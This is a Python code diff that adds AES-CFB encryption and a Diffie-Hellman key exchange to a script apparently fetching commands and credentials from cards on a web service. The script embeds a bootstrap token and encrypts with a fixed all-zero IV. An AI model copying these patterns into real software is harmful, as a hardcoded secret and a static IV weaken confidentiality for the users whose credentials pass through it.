@@ -2,12 +2,14 @@ import requests
 import json
 import time
 from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.serialization import PublicFormat
 from cryptography.hazmat.primitives.serialization import Encoding
 from cryptography.hazmat.primitives.serialization import load_pem_public_key
-
+import base64
 
 # maybe erase bootstrap
 BOOTSTRAP_TOKEN = '0371b95aaa9e16d0089fa4d55d078f5fab508c5af7e2d82a7c57aa6be908778b'
@@ -40,6 +42,19 @@ p = 2973967954318052416002183554360453982181157940540558319940550532629762027148
 # The generator value
 g = 2
 
+def subtract_lists(list1, list2):
+    result = []
+    for d in list1:
+        if d not in list2:
+            result.append(d)
+    return result
+
+def add_lists(list1, list2):
+    result = list1.copy()
+    for d in list2:
+        if d not in list1:
+            result.append(d)
+    return result
 
 def check_response(response, err_message):
     if response.status_code != SUCCESS:
@@ -180,8 +195,29 @@ def get_command_from_card(key, token, card_id):
     return desc
 
 
-def get_creds_from_card(key, token, card_id):
-    desc = get_command_from_card(key, token, card_id)
+def encrypt(key, data):
+    data_bytes = bytes(data, 'utf-8')
+    cipher = Cipher(algorithms.AES(key), modes.CFB(b'\x00'*16), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted_message = encryptor.update(data_bytes) + encryptor.finalize()
+    base64_bytes = base64.b64encode(encrypted_message)
+    return base64_bytes
+
+
+def decrypt(key, data):
+    data_bytes = base64.b64decode(data)
+    cipher = Cipher(algorithms.AES(key), modes.CFB(b'\x00'*16), backend=default_backend())
+    decryptor = cipher.decryptor()
+    decrypted_message = decryptor.update(data_bytes) + decryptor.finalize()
+    decrypted_message_str = str(decrypted_message, 'utf-8')
+    return decrypted_message_str
+
+
+def get_creds_from_card(key, token, card_id, encryption_key):
+    encrypted_desc = get_command_from_card(key, token, card_id)
+    if not encrypted_desc:
+        return '', ''
+    desc = decrypt(encryption_key, encrypted_desc)
     if not desc or KEY_TOKEN_SEPERATOR not in desc:
         return '', ''
     desc_sep = desc.split(KEY_TOKEN_SEPERATOR)
@@ -257,16 +293,13 @@ def get_DH_parameters():
     return parameters.parameters()
 
 
-def encrypt(key, new_creds):
-    return new_creds
-
-
 def exchange_keys(key, token, list_id, is_server=False):
     # generate private and public key
     parameters = get_DH_parameters()
     private_key = parameters.generate_private_key()
     public_key = private_key.public_key()
-    public_key_bytes = public_key.public_bytes(encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo)
+    public_key_bytes = public_key.public_bytes(
+        encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo)
     other_public_key_bytes = None
     if is_server:
         my_card_name = CRED_EXCH_SERVER_NAME
@@ -299,10 +332,12 @@ def exchange_keys(key, token, list_id, is_server=False):
         print("ERROR: could not get public key.")
         return None
     # generate shared secret
-    other_public_key = load_pem_public_key(bytes(other_public_key_bytes, 'utf-8'))
+    other_public_key = load_pem_public_key(
+        bytes(other_public_key_bytes, 'utf-8'))
     shared_key = private_key.exchange(other_public_key)
     # derive key from shared secret
-    derived_key = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b'handshake data').derive(shared_key)
+    derived_key = HKDF(algorithm=hashes.SHA256(), length=32,
+                       salt=None, info=b'handshake data').derive(shared_key)
     return derived_key
 
 
